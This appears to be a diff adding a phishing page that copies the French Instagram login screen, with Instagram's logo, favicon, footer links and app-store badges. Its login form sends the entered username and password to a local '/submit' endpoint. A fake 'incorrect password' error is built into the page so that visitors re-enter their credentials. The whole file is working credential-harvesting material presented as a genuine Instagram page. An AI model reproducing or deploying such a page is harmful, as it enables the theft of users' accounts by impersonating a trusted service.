@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="image-desktop">
+        <img src="PcImage-removebg-preview.png" alt="Votre image" style="width: 100%;">
+    </div>
+    <div class="header">
+        <div class="top">
+            <div class="logo">
+                <img src="instagram.png" alt="Instagram" style="width: 175px;">
+            </div>
+            <div class="form">
+                <form action="/submit" method="post">
+                    <div class="input_field">
+                        <input type="text" name="username" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" class="input" required>
+                    </div>
+                    <div class="input_field">
+                        <input type="password" name="password" placeholder="Mot de passe" class="input" required>
+                    </div>
+                    <div class="btn"><button type="submit">Se connecter</button></div>
+                </form>
+            </div>
+            <div class="or">
+                <div class="line"></div>
+                <p>Ou</p>
+                <div class="line"></div>
+            </div>
+            <div class="dif">
+                <div class="fb">
+                    <img src="facebook.png" alt="Facebook">
+                    <a href="https://www.facebook.com/login.php">Se connecter avec Facebook</a>
+                </div>
+                <br>
+                <p style="color: red;">Désolé, votre mot de passe est incorrect. Veuillez vérifier votre mot de passe.</p>
+                <div class="forgot">
+                    <a href="https://www.instagram.com/accounts/password/reset/">Mot de passe oublié ?</a>
+                </div>
+            </div>
+        </div>
+        <div class="signup">
+            <p>Vous n'avez pas de compte ? <a href="https://www.instagram.com/accounts/emailsignup/">Inscrivez-vous</a></p>
+        </div>
+        <div class="apps">
+            <p>Obtenez l'application.</p>
+            <div class="icons">
+                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="appstore.png" alt="App Store"></a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="googleplay.png" alt="Google Play"></a>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="links">
+            <ul>
+                <li><a href="https://about.meta.com/">Meta</a></li>
+                <li><a href="https://about.instagram.com/">À propos</a></li>
+                <li><a href="https://about.instagram.com/blog">Blog</a></li>
+                <li><a href="https://about.instagram.com/about-us/careers">Carrières</a></li>
+                <li><a href="https://help.instagram.com/">Aide</a></li>
+                <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
+                <li><a href="https://privacycenter.instagram.com/">Confidentialité</a></li>
+                <li><a href="https://www.instagram.com/privacy/cookie_settings/">Paramètres des cookies</a></li>
+                <li><a href="https://help.instagram.com/581066165581870/">Conditions</a></li>
+                <li><a href="https://www.instagram.com/explore/locations/">Lieux</a></li>
+                <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
+                <li><a href="https://www.threads.net/">Threads</a></li>
+                <li><a href="https://www.facebook.com/help/instagram/261704639352628">Politique de données</a></li>
+                <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Vérifié</a></li>
+            </ul>
+        </div>
+    </div>
+    <div class="languages">
+        <select name="languages" id="languages">
+            <option value="tr.html">English (UK)</option>
+            <option value="ar.html">العربية</option>
+            <option value="cs.html">Čeština</option>
+            <option value="da.html">Dansk</option>
+            <option value="de.html">Deutsch</option>
+            <option value="el.html">Ελληνικά</option>
+            <option value="af.html">Afrikaans</option>
+            <option value="en-uk.html">Türkçe</option>
+            <option value="es-es.html">Español (España)</option>
+            <option value="es.html">Español</option>
+            <option value="fa.html">فارسی</option>
+            <option value="fi.html">Suomi</option>
+            <option value="fr.html">Français</option>
+            <option value="he.html">עברית</option>
+            <option value="id.html">Bahasa Indonesia</option>
+            <option value="no.html">Norsk</option>
+            <option value="nl.html">Nederlands</option>
+            <option value="pl.html">Polski</option>
+            <option value="ru.html">Русский</option>
+            <option value="sv.html">Svenska</option>
+            <option value="fil.html">Filipino</option>
+            <option value="tr.html">English</option>
+            <option value="zh-cn.html">中文(简体)</option>
+            <option value="gu.html">ગુજરાતી</option>
+            <option value="hr.html">Hrvatski</option>
+            <option value="fr-ca.html">Français (Canada)</option>
+            <option value="ro.html">Română</option>
+            <option value="sr.html">Српски</option>
+        </select>
+                
+        <p id="cinsta">© 2024 Instagram de Meta</p>
+    </div>
+    
+</div>
+<style>
+    @import url('https://fonts.googleapis.com/css?family=Roboto&display=swap');
+    
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        outline: none;
+        list-style: none;
+        text-decoration: none;
+        font-family: 'Roboto', sans-serif;
+    }
+    
+    body {
+        background: #fafafa;
+        font-size: 14px;
+    }
+    
+    .wrapper .header .top,
+    .wrapper .signup {
+        background: #fff;
+        border: 1px solid #e6e6e6;
+        border-radius: 1px;
+        padding: 40px 40px 20px;
+    }
+    
+    .wrapper .header .logo img {
+        display: block;
+        margin: 0 auto 35px;
+    }
+    
+    .wrapper .header .form .input_field {
+        margin-bottom: 5px;
+    }
+    
+    .wrapper .header .form .input_field .input {
+        width: 100%;
+        background: #fafafa;
+        border: 1px solid #efefef;
+        font-size: 12px;
+        border-radius: 3px;
+        color: #262626;
+        padding: 10px;
+    }
+    
+    .wrapper .header .form .input_field .input:focus {
+        border: 1px solid #b2b2b2;
+    }
+    
+    .wrapper .header .form .btn {
+        margin: 10px 0;
+        background-color: #5FB1FF;
+        border: 1px solid #5FB1FF;
+        border-radius: 8px;
+        text-align: center;
+        padding: 5px;
+    }
+    
+    .wrapper .header .form .btn button {
+        color: #fff;
+        background: none;
+        border: none;
+        font-size: 14px;
+        cursor: pointer;
+        display: block;
+        width: 100%;
+        height: 25px;
+        padding: 5px 0;
+    }
+    
+    .wrapper .header .or {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        height: 15px;
+        margin: 15px 0 20px;
+    }
+    
+    .wrapper .header .or .line {
+        width: 105px;
+        height: 2px;
+        background: #efefef
+    }
+    
+    .wrapper .header .or p {
+        color: #999;
+        font-size: 12px;
+        font-weight: 500;
+    }
+    
+    .wrapper .header .dif .fb {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    
+    .wrapper .header .dif .fb img {
+        width: 16px;
+        height: 16px;
+    }
+    
+    .wrapper .header .dif .fb p {
+        color: #385185;
+        font-weight: 500;
+        margin-left: 10px;
+    }
+    
+    .wrapper .header .dif .forgot {
+        font-size: 12px;
+        text-align: center;
+        margin-top: 20px;
+    }
+    
+    .wrapper .header .dif .forgot a {
+        color: #003569;
+    }
+    
+    .wrapper .signup {
+        margin: 10px 0 20px;
+        padding: 25px 40px;
+        text-align: center;
+        color: #262626;
+    }
+    
+    .wrapper .signup a {
+        color: #3897f0;
+    }
+    
+    .wrapper .apps {
+        text-align: center;
+        color: #262626;
+    }
+    
+    .wrapper .apps p {
+        margin-bottom: 20px;
+        margin-top: 20px;
+    }
+    
+    .wrapper .apps a img {
+        width: 135px;
+        height: 40px;
+        margin: 0 5px;
+    }
+    
+    .footer {
+        max-width: 935px;
+        width: 100%;
+        margin: 0 auto;
+        padding: 40px 0;
+        display: flex;
+        justify-content: space-between;
+    }
+    
+    .footer .links ul li {
+        display: inline-block;
+        margin-right: 10px;
+    }
+    
+    .footer .links ul li a {
+        color: #003569;
+        font-size: 12px;
+    }
+    
+    .footer .copyright {
+        color: #999;
+    }
+    
+    .body {
+        font-family: Arial, sans-serif;
+        font-size: 1rem;
+    }
+    
+    .links ul {
+        list-style-type: none;
+        padding: 0;
+    }
+    
+    .links li {
+        margin: 1px 0;
+    }
+    
+    .links a {
+        color: #757575 !important;
+        text-decoration: none;
+        font-size: 1em;
+        transition: color 0.3s ease;
+    }
+    
+    .links a:hover {
+        color: #757575 !important;
+    }
+    
+    .languages {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    
+    #languages {
+        margin: -10px 0;
+        border: 0px solid #ffffff;
+        padding: 5px;
+        border-radius: 5px;
+        width: 40px;
+        background-color: #fafafa;
+        color: #757575;
+        font-size: 12px;
+        width: auto;
+        white-space: nowrap;
+    }
+    
+    #cinsta {
+        color: #757575;
+        font-size: 12px;
+        margin-right: 10px;
+    }
+    
+    @media (max-width: 768px) {
+        .links {
+            display: block;
+            text-align: center;
+            padding: 0 2em;
+        }
+    }
+    
+    .languages {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    
+    #languages {
+        margin: -10px 0;
+        border: 0px solid #ffffff;
+        padding: 5px;
+        border-radius: 5px;
+        width: 40px;
+        background-color: #fafafa;
+        color: #757575;
+        font-size: 12px;
+        width: auto;
+        white-space: nowrap;
+    }
+    
+    #cinsta {
+        color: #757575;
+        font-size: 12px;
+        margin-right: 10px;
+    }
+    
+    @media (max-width: 1499px) {
+        .languages {
+            justify-content: center;
+        }
+    
+        #cinsta, #languages {
+            margin: 5px;
+        }
+    
+        .image-desktop {
+            display: none;
+        }
+    
+        .header {
+            position: relative;
+            max-width: 350px;
+            width: 100%;
+            height: auto;
+            margin: 50px auto;
+        }
+    }
+    
+    
+    @media (min-width: 1500px) {
+        .image-desktop {
+            position: absolute;
+            top: 0;
+            left: calc(50% - 360px);
+            z-index: 5;
+            gap: 5em;
+            max-width: 350px;
+            height: auto;
+            margin-top: 3em;
+        }
+    
+        .header {
+            position: relative;
+            max-width: 350px;
+            width: 100%;
+            height: auto;
+            margin: 50px auto;
+            margin-right: 380px;
+        }
+    
+    }
+    
+    </style>
+</body>
+</html>
